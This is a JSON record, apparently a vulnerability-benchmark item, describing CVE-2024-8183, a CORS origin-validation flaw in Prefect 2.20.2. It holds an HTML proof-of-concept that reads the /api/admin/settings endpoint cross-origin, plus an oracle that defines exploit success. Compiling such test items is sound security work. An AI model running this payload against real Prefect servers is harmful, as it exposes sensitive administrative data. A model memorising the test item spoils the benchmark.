@@ -1,0 +1,15 @@
+{
+  "file_id": "201_prefect_huntr_b801de43-ff9f-4db9-b583-4797d4f7d3d2",
+  "numeric_id": "201",
+  "library_hint": "prefect",
+  "source": "huntr",
+  "title": "CORS misconfiguration allows unauthorized domains to access sensitive data in Prefect",
+  "cve": "CVE-2024-8183",
+  "cwe": "CWE-346: Origin Validation Error",
+  "library": "prefecthq/prefect",
+  "affected_version": "== 2.20.2",
+  "vulnerable_function": "N/A",
+  "triggerability": "indirect",
+  "trigger_payload": "<!DOCTYPE html>\n<html>\n<head>\n<title>CORS PoC</title>\n</head>\n<body>\n<h1>CORS PoC</h1>\n<script>\nfetch('http://127.0.0.1:4200/api/admin/settings', {\nmethod: 'GET',\nheaders: {\n'Origin': 'http://malicious-site.com'\n}\n})\n.then(response => response.text()) // Convert the response to text\n.then(data => {\nalert('CORS PoC Response:\\n' + data); // Alert the entire response\n})\n.catch(error => {\nalert('CORS PoC Error:\\n' + error); // Alert any error that occurs\n});\n</script>\n</body>\n</html>",
+  "oracle": "An alert containing the response data from the API endpoint is displayed in the victim's browser, indicating successful cross-origin data access."
+}
